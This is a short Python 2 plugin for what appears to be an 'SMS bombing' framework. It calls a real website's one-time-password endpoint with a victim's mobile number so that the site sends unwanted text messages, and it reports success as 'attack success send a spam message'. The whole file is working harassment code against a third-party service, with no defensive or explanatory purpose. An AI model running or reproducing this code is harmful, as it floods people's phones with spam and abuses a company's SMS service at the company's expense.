#!/usr/bin/env python
# coding=utf-8
__author__ = 'pyphrb'
from baseframe import SmsFrame
from curl import HttpRequest
class MyCode(SmsFrame):
    sms_exp = {
        'exp': {
            'name': None,
            'author': 'SMS_BOMBING',
            'create_time': '2014-12-11'
        }
    }

    def verify(self, mobile):
        self.request = HttpRequest.Http("http://www.yunjiazheng.com", self.args[0], "/member/SendDynamicPassword?mobile=")
        if "0" in self.request.get_request():
            print 'attack success send a spam message' + 'to' + self.args[0]
        else:
            print 'attack send message failed or re is not current'

if __name__ == "__main__":
    mc = MyCode()
    mc.run()